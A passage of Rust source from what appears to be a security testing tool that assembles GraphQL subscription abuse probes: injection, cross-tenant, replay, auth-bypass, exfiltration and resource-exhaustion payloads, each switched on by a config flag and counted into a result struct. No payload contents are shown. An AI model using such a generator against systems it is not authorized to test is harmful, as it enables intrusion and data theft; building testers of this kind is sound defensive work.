            .flat_map(|field| generate_injection_payloads(field, &[]))
            .collect()
    } else {
        Vec::new()
    };

    let cross_tenant_probes = if config.enable_cross_tenant {
        effective_fields
            .iter()
            .flat_map(|field| generate_cross_tenant_probes(field, &[]))
            .collect()
    } else {
        Vec::new()
    };

    let replay_payloads = if config.enable_replay {
        effective_fields
            .iter()
            .flat_map(|field| generate_replay_payloads(field))
            .collect()
    } else {
        Vec::new()
    };

    let total_payload_count = auth_bypass_tests.len()
        + exfiltration_subs.len()
        + exhaustion_payloads
            .iter()
            .map(|p| p.queries.len())
            .sum::<usize>()
        + injection_payloads.len()
        + cross_tenant_probes.len()
        + replay_payloads.len()
        + enumeration.blind_probes.len()
        + enumeration.suggestion_probes.len();

    SubscriptionAbuseResult {
        enumeration,
        auth_bypass_tests,
        exfiltration_subs,
        exhaustion_payloads,
        injection_payloads,
        cross_tenant_probes,
        replay_payloads,
        total_payload_count,
    }
}
